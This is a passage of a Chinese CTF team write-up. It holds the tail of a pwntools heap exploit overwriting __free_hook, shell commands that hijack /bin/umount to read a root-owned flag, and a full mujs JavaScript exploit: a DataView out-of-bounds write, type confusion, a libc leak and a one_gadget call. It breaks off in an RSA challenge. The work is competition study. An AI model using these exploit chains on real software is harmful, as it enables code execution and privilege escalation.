class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0xd7</span> - i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xd0</span> + i,<span class="string">&#x27;11111112&#x27;</span>)</span><br><span class="line">libc_base = u64(show(<span class="number">0xd7</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3EBCA0</span></span><br><span class="line">libc.address = libc_base </span><br><span class="line">log.success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add(<span class="number">0xf2</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf7</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf6</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf4</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf5</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf1</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xf2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">delete(<span class="number">0xf5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xf8</span>)</span><br><span class="line"><span class="comment"># delete(0xf0)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xf7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b * $rebase(0xF0F)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(3,&#x27;a&#x27;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xef</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0xee</span>,p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0xed</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xec</span>,p64(system))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="kqueue">kqueue</span><a href="#kqueue" class="header-anchor"></a></h2><h3><span id="fei-yu-qi">非预期</span><a href="#fei-yu-qi" class="header-anchor"></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls -al</span><br><span class="line">drwxrwxr-x   14 ctf      ctf              0 Feb 27 11:54 .</span><br><span class="line">drwxrwxr-x   14 ctf      ctf              0 Feb 27 11:54 ..</span><br></pre></td></tr></table></figure>
<p>权限没配好,根目录ctf权限,直接非预期<br><code>exp</code>如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv bin bin1</span><br><span class="line">/bin1/mkdir bin</span><br><span class="line">/bin1/chmod 777 bin</span><br><span class="line">/bin1/echo &quot;/bin1/cat /root/flag&quot; &gt; /bin/umount</span><br><span class="line">/bin1/chmod 777 /bin/umount</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<h2><span id="kqueue-s-revenge">kqueue’s revenge</span><a href="#kqueue-s-revenge" class="header-anchor"></a></h2><p>diff了一下直接有flag<br><img src="./20220301005626084.jpg" alt="img"></p>
<h2><span id="mujs">mujs</span><a href="#mujs" class="header-anchor"></a></h2><h3><span id="ti-mu-miao-shu">题目描述</span><a href="#ti-mu-miao-shu" class="header-anchor"></a></h3><p>出题人给出的题目描述如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd0a0972b4428771e6a3887da2210c7c9dd40f9c  </span><br><span class="line">nc 124.71.182.21 9999</span><br></pre></td></tr></table></figure>

<p>在附件中有<code>mujs</code>的源码，这个是一个在嵌入式设备上常用的js代码解释器。这个源码的代码量还是很大的。同时附件里还有一个编译好的二进制文件，以及libc文件。从libc文件可以得知远程的运行环境是libc.2.31</p>
<p>题目描述中给出的这个hash字符告诉我们这个源码是来自于这个hash对应的commit的<code>mujs</code>源码</p>
<p><a href="https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c">https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c</a> </p>
<p>所以使用diff对比了这两个源码。发现主要的差别在两个地方</p>
<ul>
<li>一些内置方法在main.c中被禁用了</li>
<li>新增了dataview.c文件。 这个是<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView">DataView</a> 方法的一个简化版的实现</li>
</ul>
<h3><span id="xun-zhao-lou-dong-dian">寻找漏洞点</span><a href="#xun-zhao-lou-dong-dian" class="header-anchor"></a></h3><p>队友的思路首先是从最近的CVE里寻找一些漏洞，但是没有发现有用的信息，所以这个题应该是魔改的这个版本的源码。而且被魔改的部分其实代码量不算大，直接审就好了。</p>
<p>首先我们需要理解DataView都做了什么，都有哪些方法。一些常用的用法如下所示。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="number">10</span>)</span><br><span class="line"><span class="title function_">print</span>(x.<span class="title function_">getUint8</span>(<span class="number">0</span>))</span><br><span class="line"><span class="title function_">print</span>(x.<span class="title function_">getUint8</span>(<span class="number">9</span>))</span><br><span class="line"><span class="title function_">print</span>(x.<span class="title function_">getUint8</span>(<span class="number">12</span>)) <span class="comment">// should not work</span></span><br><span class="line"><span class="title function_">print</span>(x.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="number">10</span>))</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>其实从<code>jsB_initdataview</code>函数当中大概可以看出来都有哪些方法，然后自己试一下就可以试出来这些方法怎么用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">jsB_initdataview</span>(<span class="params">js_State *J</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_">js_pushobject</span>(J, J-&gt;<span class="title class_">DataView</span>_prototype);</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.getUint8&quot;</span>, <span class="title class_">Dv</span>_getUint8, <span class="number">1</span>);</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.setUint8&quot;</span>, <span class="title class_">Dv</span>_setUint8, <span class="number">2</span>);</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.getUint16&quot;</span>, <span class="title class_">Dv</span>_getUint16, <span class="number">1</span>);</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.setUint16&quot;</span>, <span class="title class_">Dv</span>_setUint16, <span class="number">2</span>);</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.getUint32&quot;</span>, <span class="title class_">Dv</span>_getUint32, <span class="number">1</span>);</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.setUint32&quot;</span>, <span class="title class_">Dv</span>_setUint32, <span class="number">2</span>);</span><br><span class="line">		<span class="title function_">jsB_propf</span>(J, <span class="string">&quot;DataView.prototype.getLength&quot;</span>, <span class="title class_">Dv</span>_getLength, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_">js_newcconstructor</span>(J, jsB_new_DataView, jsB_new_DataView, <span class="string">&quot;DataView&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_">js_defglobal</span>(J, <span class="string">&quot;DataView&quot;</span>, <span class="variable constant_">JS_DONTENUM</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后经过一阵审计，很容易就能发现这里存在一个越界写操作，可以越界写9字节</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title class_">Dv</span>_setUint8(js_State *J)</span><br><span class="line">&#123;</span><br><span class="line">	js_Object *self = <span class="title function_">js_toobject</span>(J, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (self-&gt;type != <span class="variable constant_">JS_CDATAVIEW</span>) <span class="title function_">js_typeerror</span>(J, <span class="string">&quot;not an DataView&quot;</span>);</span><br><span class="line">	size_t index = <span class="title function_">js_tonumber</span>(J, <span class="number">1</span>);</span><br><span class="line">	uint8_t value = <span class="title function_">js_tonumber</span>(J, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (index &lt; self-&gt;u.<span class="property">dataview</span>.<span class="property">length</span>+<span class="number">0x9</span>) &#123;</span><br><span class="line">		self-&gt;u.<span class="property">dataview</span>.<span class="property">data</span>[index] = value;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_">js_error</span>(J, <span class="string">&quot;out of bounds access on DataView&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是这里同时也存在一个整数溢出（但是是无符号的)，可以让我们可以前溢9字节。但是由于这里没有什么free的操作，所以很难利用。因此还是后溢9字节可用性高一点。</p>
<h3><span id="li-yong-lou-dong">利用漏洞</span><a href="#li-yong-lou-dong" class="header-anchor"></a></h3><h4><span id="lei-xing-hun-yao">类型混淆</span><a href="#lei-xing-hun-yao" class="header-anchor"></a></h4><p>因为说溢出9字节，这个多出的一字节很容易令人联想到类型混淆。下面是 js_Object 的结构。可见只要溢出一字节就可以覆盖它的type字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">js_Class</span> <span class="title">type</span>;</span></span><br><span class="line">        <span class="type">int</span> extensible;</span><br><span class="line">        js_Property *properties;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面给出类型混淆的poc</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(c)</span><br><span class="line">b.<span class="title function_">setUint8</span>(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">8</span>); <span class="comment">// change type of c to something</span></span><br><span class="line"><span class="title function_">print</span>(c)</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[object <span class="title class_">DataView</span>]</span><br><span class="line">[object <span class="title class_">String</span>]</span><br></pre></td></tr></table></figure>

<h4><span id="yue-jie-xie-dataview-de-length-zi-duan">越界写Dataview的Length字段</span><a href="#yue-jie-xie-dataview-de-length-zi-duan" class="header-anchor"></a></h4><p>js_Objec 使用了 C语言里的union结构，所以不同类型可以共用相同的内存。队友的想法是利用与DataView里Length字段占用内存相同的其他类型的字符来修改DataLength。<strong>这样我们就可以扩大任意地址读写的范围，起码可以拓展到整个堆上了，而不仅仅是越界9字节。</strong></p>
<p>整个Js_Objec 结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">js_Class</span> <span class="title">type</span>;</span></span><br><span class="line">        <span class="type">int</span> extensible;</span><br><span class="line">        js_Property *properties;</span><br><span class="line">        <span class="type">int</span> count; </span><br><span class="line">        js_Object *prototype;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">int</span> boolean;</span><br><span class="line">                <span class="type">double</span> number;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>;</span><br><span class="line">                        <span class="type">int</span> length;</span><br><span class="line">                &#125; s;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="type">int</span> length;</span><br><span class="line">                &#125; a;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        js_Function *function;</span><br><span class="line">                        js_Environment *scope;</span><br><span class="line">                &#125; f;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">                        js_CFunction function;</span><br><span class="line">                        js_CFunction constructor;</span><br><span class="line">                        <span class="type">int</span> length;</span><br><span class="line">                        <span class="type">void</span> *data;</span><br><span class="line">                        js_Finalize finalize;</span><br><span class="line">                &#125; c;</span><br><span class="line">                js_Regexp r;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        js_Object *target;</span><br><span class="line">                        js_Iterator *head;</span><br><span class="line">                &#125; iter;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="type">const</span> <span class="type">char</span> *tag;</span><br><span class="line">                        <span class="type">void</span> *data;</span><br><span class="line">                        js_HasProperty has;</span><br><span class="line">                        js_Put put;</span><br><span class="line">                        js_Delete delete;</span><br><span class="line">                        js_Finalize finalize;</span><br><span class="line">                &#125; user;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="type">uint32_t</span> length;</span><br><span class="line">                    <span class="type">uint8_t</span>* data;</span><br><span class="line">                &#125; dataview;</span><br><span class="line">        &#125; u;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>比如<code>js_Object.u.dataview.length</code> 在结构体内所处的偏移是和<code>js_Object.u.number</code> 以及<code>s_Object.u.c.name</code>这两个是相同的。</p>
<p>所以我们可以修改<code>js_Object.u.number</code>，队友找到了下面的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">js_setdate</span><span class="params">(js_State *J, <span class="type">int</span> idx, <span class="type">double</span> t)</span></span><br><span class="line">&#123;</span><br><span class="line">        js_Object *self = js_toobject(J, idx);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;type != JS_CDATE)</span><br><span class="line">                js_typeerror(J, <span class="string">&quot;not a date&quot;</span>);</span><br><span class="line">        self-&gt;u.number = TimeClip(t);</span><br><span class="line">        js_pushnumber(J, self-&gt;u.number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... called from here</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">Dp_setTime</span><span class="params">(js_State *J)</span></span><br><span class="line">&#123;</span><br><span class="line">        js_setdate(J, <span class="number">0</span>, js_tonumber(J, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们试一下</p>
<p><code>JS_CDATE</code>的值是10，我们需要把这个DataView结构的type字段溢出成10就可以了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(c)</span><br><span class="line">b.<span class="title function_">setUint8</span>(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set type of c to Date</span></span><br><span class="line"><span class="title function_">print</span>(c)</span><br><span class="line">c.<span class="title function_">setTime</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[object DataView]</span><br><span class="line">[object Date]</span><br><span class="line">TypeError: undefined is not callable</span><br><span class="line">        at tconf.js:10</span><br></pre></td></tr></table></figure>

<p>Emmm，居然是报错了。难道进行了类型混淆还是不能调用setTime方法么？队友曾经为了这个问题困扰了许久，他意识到了对象的prototype 在我们一创建的时候其实就已经确定了。所以当我们改变type的时候prototype并没有改变。而prototype基本就已经定义了这个对象可以调用哪些方法，可恶。</p>
<p>这时无敌的队友发现，js里有个讨厌的东西叫 <code>this</code>，这个东西在这个时候算是雪中送碳吧</p>
<p>我们仍然可以通过js的<code>bind</code>调用<code>setTime</code> :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Date</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">setTime</span>.<span class="title function_">bind</span>(c)(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>

<p>成功了！</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(c)</span><br><span class="line">b.<span class="title function_">setUint8</span>(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set type of c to Date</span></span><br><span class="line"><span class="title function_">print</span>(c)</span><br><span class="line"><span class="title class_">Date</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">setTime</span>.<span class="title function_">bind</span>(c)(<span class="number">1.09522e+12</span>)</span><br><span class="line"></span><br><span class="line">b.<span class="title function_">setUint8</span>(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// type of c back to DataView</span></span><br><span class="line"><span class="title function_">print</span>(c.<span class="title function_">getLength</span>())</span><br></pre></td></tr></table></figure>

<p>看到这里大家可能会有些疑问，就是<code>u.number</code>是8字节的<code>double</code>类型，而我们要覆盖的<code>u.dataview.length</code>只有四字节，这样会不会覆盖到后面紧跟着的四字节的<code>u.dataview.data</code>，毕竟这个是个指针，覆盖掉了容易导致crash。其实是不会的，因为这个结构体有8字节对齐。</p>
<h4><span id="shi-yong-dui-shang-de-yue-jie-du-xie-lai-shi-xian-dai-ma-zhi-xing">使用堆上的越界读写来实现代码执行</span><a href="#shi-yong-dui-shang-de-yue-jie-du-xie-lai-shi-xian-dai-ma-zhi-xing" class="header-anchor"></a></h4><p>到了这个阶段，我们已经可以通过修改dataview的length字段来实现堆上的任意地址读写了。并且堆布局也是我们相对可控的了。为了更好的控制堆上的结构，我的队友在<code>c</code>后面又申请了两个Dataview。并且我们知道，如果我们申请的堆的大小大于128k的话我们会使用mmap来申请空间，这个是malloc函数的一个策略。而这个mapp的地址往往距离libc地址很近，因此我们可以通过这种方法来泄漏libc基地址。</p>
<p>所以我们用上述的方法泄漏了libc地址之后，可以伪造一个<code>JS_CCFUNCTION</code>类型，他有一个字段叫做<code>u.c.function</code>我们可以轻易用下面的方式调用这个函数指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">js_call</span><span class="params">(js_State *J, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">                        jsR_callfunction(J, n, obj-&gt;u.f.function, obj-&gt;u.f.scope);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="zui-zhong-exp">最终exp</span><a href="#zui-zhong-exp" class="header-anchor"></a></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">e = <span class="title class_">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">f = <span class="title class_">DataView</span>(<span class="number">0x1000</span> * <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">b.<span class="title function_">setUint8</span>(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set c type to Date</span></span><br><span class="line"><span class="title class_">Date</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">setTime</span>.<span class="title function_">bind</span>(c)(<span class="number">1.09522e+12</span>) <span class="comment">// write number + length</span></span><br><span class="line">b.<span class="title function_">setUint8</span>(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// set c type back to DataView</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">4294967296</span> <span class="comment">// 1&lt;&lt;32</span></span><br><span class="line">libb_addr_off = <span class="number">472</span></span><br><span class="line">libc_leak = c.<span class="title function_">getUint32</span>(libb_addr_off) + (c.<span class="title function_">getUint32</span>(libb_addr_off+<span class="number">4</span>)*sh32)</span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x7ffff7c31000</span> - <span class="number">0x7ffff6bfe010</span> <span class="comment">// got this from gdb</span></span><br><span class="line">libc_base = libc_leak + libc_off</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;libc base:&#x27;</span>, libc_base.<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">one_gag = libc_base + <span class="number">0xe6c84</span></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;onegadget:&#x27;</span>, one_gag.<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">e_obj_off = <span class="number">192</span></span><br><span class="line">c.<span class="title function_">setUint8</span>(<span class="number">160</span>, <span class="number">4</span>) <span class="comment">// this sets type to JS_CCFUNCTION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set lower 4 bytes of js_CFunction function</span></span><br><span class="line">c.<span class="title function_">setUint32</span>(e_obj_off+<span class="number">8</span>, one_gag&amp;<span class="number">0xffffffff</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">// set upper 4 bytes of js_CFunction function</span></span><br><span class="line">c.<span class="title function_">setUint32</span>(e_obj_off+<span class="number">8</span>+<span class="number">4</span>, <span class="title class_">Math</span>.<span class="title function_">floor</span>(one_gag/sh32)&amp;<span class="number">0xffffffff</span>) </span><br><span class="line"><span class="title function_">e</span>() <span class="comment">// e is now a function so we can call it </span></span><br></pre></td></tr></table></figure>

<p>队友表示他之前也没做过这种mujs的利用，但是这些堆利用的基本思路和很多大型项目比如v8的利用是共通的，但是那些大型项目由于运行时更为复杂，堆空间要相对更不可控一些。</p>
<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="large-case">large case</span><a href="#large-case" class="header-anchor"></a></h2><p>思路如下：</p>
<p>这题没有提供e，给了p、q、r，并且条件里说了e由三个素因子组成，所以不难想到分解p-1，q-1，r-1，从而对e的可能值进行组合。不过就算组合过了，也不能用常规方法解题，因为本题e phi不互素，所以考虑对其开根，又考虑到这题的e会相对较大，所以用amm算法对其开根。<br>在这之前可以对e的因子进行猜测，由于需要使用到crt组合，所以因子不会太大，并且因子不会是共有的因数，于是可以猜测e使用p-1中的757，q-1中的66553，r-1中的5156273（如果不对，再进行调整，可供调整的选择不多，一些小的因数比如3、7，可以直接跑，很快就可以知道不满足）。<br>这是可以注意到flag的长度在1025-2048比特之间，所以我们不需要考虑r的部分，只考虑p、q。有了猜测的e，我们就可以把多于2048的pad去掉，留下一部分\x00<br>$$c\equiv{m^e(2^{1024})^e}\pmod{n} $$<br>$$c2^{-1024e}\equiv{m^e}\pmod{n}$$</p>
<p>之后分别计算模p和模q的情况</p>
<p>$$cp\equiv{m^{e1 \times e2 \times e3}}\pmod{p} $$</p>
<p>$$cp^{-e2 \times e3}\equiv{m^{e1}}\pmod{p} $$</p>
<p>$$ cq\equiv{m^{e1 \times e2 \times e3}}\pmod{q} $$</p>
